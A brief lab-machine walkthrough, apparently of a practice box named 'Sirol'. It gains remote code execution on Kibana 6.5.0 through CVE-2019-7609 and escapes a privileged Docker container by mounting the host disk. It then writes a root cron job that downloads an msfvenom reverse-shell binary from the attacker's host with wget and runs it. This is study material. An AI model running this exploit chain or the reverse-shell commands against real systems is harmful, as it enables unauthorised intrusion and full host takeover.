# Sirol

### Enumeration

```
5601/tcp  open   esmagent?
```

[http://192.168.94.54:5601/app/kibana](http://192.168.94.54:5601/app/kibana) - kibana 6.5.0

### Initial Access

There was a RCE vulnerability in 2019 for Kibana versions < 6.6.0&#x20;

[https://github.com/LandGrey/CVE-2019-7609/](https://github.com/LandGrey/CVE-2019-7609/)

```
$ python CVE-2019-7609-kibana-rce.py -u http://192.168.94.54:5601 -host 192.168.49.94 -port 80 --shell
```

### PrivEsc

Looks like, we are in a container.

[https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)

Well configured docker containers won't allow command like `fdisk -l`. However on miss-configured docker command where the flag `--privileged` is specified, it is possible to get the privileges to see the host drive.

```
root@0873e8062560:/# fdisk -l
fdisk -l
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x16939df4

Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 37750783 37748736  18G 83 Linux
/dev/sda2       37752830 41940991  4188162   2G  5 Extended
/dev/sda5       37752832 41940991  4188160   2G 82 Linux swap / Solaris
```

```
mkdir -p /mnt/root
mount /dev/sda1 /mnt/root
```

We can access the filesystem of the host via /mnt/root directory.

Once the volume is mounted, we can create a cron job. To get root shell.

```
$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.1.1 LPORT=80
echo '* * * * * root /bin/bash -c "/usr/bin/wget http://192.168.1.1/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell"' > /mnt/root/snaps/gcron_enabled
```
